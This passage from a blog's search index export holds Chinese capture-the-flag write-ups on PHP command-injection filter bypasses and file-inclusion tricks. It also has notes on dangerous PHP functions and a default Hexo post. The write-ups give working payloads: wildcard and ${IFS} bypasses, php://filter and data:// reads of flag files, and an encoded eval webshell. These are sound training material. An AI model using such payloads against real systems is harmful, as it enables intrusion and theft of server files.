?c&#x3D;nl&lt;&gt;fla\g.php|| 查看源代码<br>###52<br>分析多过滤了一些内容<br>解答：构造playload:?c&#x3D;nl${IFS}&#x2F;????|| ?c&#x3D;nl${IFS}&#x2F;fl’’ag||<br>###53<br>分析:过滤了;|cat|flag|空格|数字|</em>|几个查看文件命令|%|&lt;&gt;<br>解答：$IFS符号如果是在当前目录读文件则中间要用’’来分隔一下如果读其他路径下的如根目录 &#x2F; 下的文件 则不用使用符分割$IFS后边可以使用符号 但是不能直接跟字符 会显示无效命令<br>构造playload：?c&#x3D;nl${IFS}????.??? 查看源代码<br>###54<br>分析:增加了很多过滤信息<br>解答：构造playload：?c&#x3D;uniq${IFS}????.???查看源代码<br>###55<br>分析代码： if(!preg_match(“&#x2F;;|[a-z]|<code>|%|\x09|\x26|&gt;|&lt;/i”, $c)) 过滤了字母 解答：构造layload：?c=/???/????64 ????.??? ?c=/???/???/????2 ????.??? 查看源代码 ###56 分析代码： if(!preg_match(“/;|[a-z]|[0-9]|\$|(|&#123;|&#39;|&quot;|</code>|%|\x09|\x26|&gt;|&lt;&#x2F;i”, $c))<br>过滤了字母和数字<br>解答：无数字字母getshell<br>###57<br>分析代码： if(!preg_match(“&#x2F;;|[a-z]|[0-9]|<code>||#|&#39;|&quot;|</code>|%|\x09|\x26|\x0a|&gt;|&lt;|.|,|?|*|-|&#x3D;|[&#x2F;i”, $c))<br>过滤了字母、数字、分号、2个通配符<br>解答：取反 构造payload：查看源代码<br>?c&#x3D;$(($(($(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))))))<br>###58-65<br>分析代码：禁用函数<br>解答：POST传参<br>构造playload：c&#x3D;show_source(‘flag.php’); 查看源代码<br>###66<br>分析代码：用show_source()，回显该函数被禁用<br>解答：post 传参 构造playload：c&#x3D;print_r(scandir(“&#x2F;“)); 查看源代码<br>###67<br>分析代码：用show_source()，回显该函数被禁用多过滤了print_r()函数，可以使用var_dump()函数代替<br>解答：POST传参 c&#x3D;var_dump(scandir(‘&#x2F;‘)); c&#x3D;highlight_file(‘&#x2F;flag.txt’); 查看源代码<br>###68<br>分析代码：这题把highlight_file()函数给ban了，看不到源码<br>解答：c&#x3D;var_dump(scandir(‘&#x2F;‘)); c&#x3D;include(‘&#x2F;flag.txt’);查看源代码<br>虽然把print_r()函数ban了，但是这题没有ban include，可以利用文件包含漏洞读取flag.txt<br>###69-70<br>分析代码：var_dump()函数被ban，那就用var_export()函数<br>解答：c&#x3D;var_export(scandir(‘&#x2F;‘)); c&#x3D;include(‘&#x2F;flag.txt’); 查看源代码<br>###71<br>分析代码：$s &#x3D; ob_get_contents();&#x2F;&#x2F;得到缓冲区的数据。 ob_end_clean();&#x2F;&#x2F;会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容<br>解答：构造playload;c&#x3D;var_export(scandir(‘&#x2F;‘));exit(); c&#x3D;include(“&#x2F;flag.txt”);die(); 查看源代码<br>###72<br>分析代码：存在open_basedir，利用glob伪协议在筛选目录时不受open_basedir制约<br>解答：知道了文件是&#x2F;flag0.txt之后，就要想办法绕过open_basedir和disable_functions来读了。<br>需要在burp中编码后发送<br>###73-74<br>分析代码：glob协议遍历出文件<br>解答：1.构造playload：c&#x3D;var_export(scandir(‘&#x2F;‘));exit(); &#x2F;&#x2F;发现根目录下有flagc.txt c&#x3D;include(‘&#x2F;flagc.txt’);exit(); 查看源代码<br>2.可以利用数组遍历的方法输出根目录下的所有文件<br>###75-76<br>分析代码：数据库的连接是读配置文件得到的SQL语句来读文件绕过open_basedir和disable_function<br>解答：<br>c&#x3D;?&gt; 查看源代码<br>###77<br>分析：这题在题干中说到php7.4，可以想到FFI<br>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。<br>解答：通过FFI，可以实现调用system函数，从而将flag直接写入一个新建的文本文件中，然后访问这个文本文件，获得flag<br>###118<br>分析：了解一下Linux 基础知识：Bash的内置变量常见 Bash 内置变量介绍：<br>root@baba:# echo ${PWD}<br>&#x2F;root<br>root@baba:# echo ${PWD:1:1} &#x2F;&#x2F;表示从第2（1+1）个字符开始的一个字符<br>r<br>root@baba:# echo ${PWD:0:1} &#x2F;&#x2F;表示从第1（0+1）个字符开始的一个字符<br>&#x2F;<br>root@baba:# echo ${PWD:0:1} &#x2F;&#x2F;表示从最后一个字符开始的一个字符<br>t<br>root@baba:# echo ${PWD:A} &#x2F;&#x2F;字母代表0<br>t<br>所以可以利用各个环境变量的最后一位来构造命令。 ${PWD}在这题肯定是&#x2F;var&#x2F;www&#x2F;html，而${PATH}通常是bin,那么${PWD:A}的结果就应该是’ l ‘，因为${PATH:A}的结果是’ n ‘，那么他们拼接在一起正好是nl，能够读取flag，因为通配符没有被过滤，所以可以用通配符代替flag.php<br>解答：code&#x3D;${PATH:A}${PWD:A} ????.??? 查看源代码<br>###119-120<br>分析：多过滤了path<br>解答：code&#x3D;${PWD::$</p>
]]></content>
  </entry>
  <entry>
    <title>命令执行函数</title>
    <url>/2022/06/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    <content><![CDATA[<p>命令执行函数</p>
<span id="more"></span>

<h2 id="远程命令执行函数"><a href="#远程命令执行函数" class="headerlink" title="远程命令执行函数"></a>远程命令执行函数</h2><p>1.eval() 函数传入的参数必须为 PHP 代码，并以分号结尾。<br>2.assert() 函数是直接将传入的参数当成 PHP 代码执行，不需要以分号结尾。<br>3.&#x2F;e 修正符使 preg_replace() 将替换后的 repl 参数当作 PHP 代码并以 eval() 函数方式执行。<br>提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语<br>4.array_map()  将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带新值的数组。<br>动态函数执行 PHP 函数可直接由字符串拼接而成。<br>5.Python 中的执行命令函数：exec()<br>6.Java 没有类似于前面两者的函数，但是有反射机制，并且有基于反射机制的表达式引擎，如：0GNL、SpEL、MVEL<br>##系统执行命令<br>###常用系统执行命令<br>执行外部程序，并显示输出system()<br>执行一个外部程序exec()<br>通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。shell_exec()<br>执行 unix 系统命令并且显示原始输出passthru()<br>在当前进程空间执行指定程序pcntl_exec()<br>打开进程文件指针popen()<br>执行一个命令，并且打开用来输入&#x2F;输出的文件指针proc_open()<br>###常用命令执行特殊字符<br>“cmd1|cmd2”：无论 cmd1 是否成功执行，都执行 cmd2 语句。<br>“cmd1||cmd2”：仅在 cmd1 语句执行 false 时执行后面的语句。<br>“cmd1&amp;cmd2”：无否成功执行，都执行 cmd2 语句。<br>“cmd1&amp;&amp;cmd2”：cmd1 成功执行时，才执行 cmd2 ，否则不执行<br>only unix   “&gt;(cmd)”：如当执行 &gt;(ls) 时，bash 将使用 &#x2F;dev&#x2F;fd&#x2F;63 替换 ls 命令，将 &#x2F;dev&#x2F;fd&#x2F;63 连接 bash 标准输入并执行 ls 命令(ls没有使用标准输入)。bash 将写入新的标准提示符，并紧跟着在此提示符后面输出 ls 命令的结果。在提示符下方的光标位置中，你可以输入任何的命令，这些命令都会生效，但是不会显示任何提示。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="通过命令执行写入恶意文件"><a href="#通过命令执行写入恶意文件" class="headerlink" title="通过命令执行写入恶意文件"></a>通过命令执行写入恶意文件</h3><h3 id="利用特殊字符执行系统命令"><a href="#利用特殊字符执行系统命令" class="headerlink" title="利用特殊字符执行系统命令"></a>利用特殊字符执行系统命令</h3>]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2022/05/30/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span></code></pre>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="hljs bash">$ hexo server</code></pre>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="hljs bash">$ hexo generate</code></pre>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="hljs bash">$ hexo deploy</code></pre>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2022/06/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<p>文件包含</p>
<span id="more"></span>

<h3 id="78"><a href="#78" class="headerlink" title="78"></a>78</h3><p>提示: ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>分析：使用 include进行了文件包含<br>解答: filter伪协议 payload 在网址后输入&#x2F;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php 然后base64解码</p>
<h3 id="79"><a href="#79" class="headerlink" title="79"></a>79</h3><p>提示：?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;<br>PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs &#x3D;&#x3D;&#x3D;&gt; &lt;?php system(‘cat flag.php’);<br>分析：替换了 php，data伪协议<br>解答:?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;查看源码</p>
<h3 id="87"><a href="#87" class="headerlink" title="87"></a>87</h3><p>提示：php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;2.php<br>%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%2<br>5%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%<br>33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36<br>%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%3<br>3%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%<br>25%37%32%25%36%33%25%36%35%25%33%64%25%33%33%25%32%65%25%37%30%25%36%38%25%37%30<br>因为通过base64过滤之后就只有(phpdie)6个字符我们就要添加2个字符让前面的可以进行编码<br>分析：不同变量死亡绕过。<br>解答：</p>
<h3 id="88"><a href="#88" class="headerlink" title="88"></a>88</h3><p>提示：发现过滤的还是比较多，但是没有过滤 : 那我们就可以使用PHP伪协议就是 这里使用的是 data:&#x2F;&#x2F;text&#x2F;plain;base64,poc  只是注意的是编码成base64的时候要去掉 ＝<br>解答：实际上就是去掉base64后的&#x3D;，作为填充使用，不影响结果 ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4 查看源码<br>###116<br>分析：过滤了几个过滤器，常用的base64肯定不能用了<br>解答：构造playload：?file&#x3D;compress.zlib:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php或者?file&#x3D;flag.php<br>然后进行抓包</p>
<h3 id="117"><a href="#117" class="headerlink" title="117"></a>117</h3><p>提示：payload: file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;a.php post:contents&#x3D;?&lt;hp pvela$(P_SO[T]1;)&gt;?<br>分析：死亡绕过不同变量 这里过滤了 base64那就是 base64-decode了。过滤了string不能使用 字符过滤器了，但是convert还是可以使用 转换过滤器可以使用convert.iconv.*<br>解答：构造payload：file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;a.php<br>然后POST传参： post:contents&#x3D;?&lt;hp pvela$(P_SO[T]1;)&gt;?</p>
]]></content>
  </entry>
  <entry>
    <title>文件包含原理</title>
    <url>/2022/06/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    <content><![CDATA[<p>文件包含</p>
<span id="more"></span>

<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>文件包含漏洞的产生原因是在通过 PHP 的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。<br>###常见的四个函数<br>1、include() 当使用该函数包含文件时，只有代码执行到 include() 函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。<br>2、include_once() 功能和 include() 相同，区别在于当重复调用同一文件时，程序只调用一次。<br>3、require() 只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行<br>4、require_once() 它的功能与 require() 相同，区别在于当重复调用同一文件时，程序只调用一次。<br>当使用这四个函数包含一个新文件时，该文件将作为 PHP 代码执行，php 内核并不在意该被包含的文件是什么类型。所以如果被包含的是 txt 文件、图片文件、远程 url、也都将作为 PHP 代码执行。这一特性，在实施攻击时非常有用。<br>###分类<br>文件包含漏洞可以分为 RFI (远程文件包含)和 LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是 php.ini 中是否开启了allow_url_include。如果开启 了我们就有可能包含远程文件。<br>1、本地文件包含 LFI(Local File Include)<br>2、远程文件包含 RFI(Remote File Include)（需要 php.ini 中 allow_url_include&#x3D;on、allow_url_fopen &#x3D; On）<br>在 php.ini 中，allow_url_fopen 默认一直是 On，而 allow_url_include 从 php5.2 之后就默认为 Off。</p>
]]></content>
  </entry>
</search>
